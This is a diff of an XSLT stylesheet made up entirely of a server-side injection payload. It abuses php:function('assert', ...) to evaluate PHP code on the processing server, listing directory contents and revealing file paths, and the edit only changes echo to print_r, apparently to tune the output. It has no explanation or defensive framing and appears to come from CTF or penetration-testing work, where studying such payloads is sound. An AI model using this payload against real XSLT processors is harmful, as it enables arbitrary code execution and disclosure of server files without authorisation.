@@ -2,8 +2,8 @@
 <xsl:template match="/">
 <xsl:value-of select="php:function('assert','scandir(__DIR__);')"/>
 <xsl:value-of select="php:function('assert','getcwd()')"/>
-<xsl:value-of select="php:function('assert','echo __FILE__;')"/>
-<xsl:value-of select="php:function('assert','echo __DIR__;')"/>
+<xsl:value-of select="php:function('assert','print_r(__FILE__)')"/>
+<xsl:value-of select="php:function('assert','print_r(__DIR__)')"/>
 
  <xsl:value-of select="php:function('implode',',','scandir(__DIR__)')"/>
 
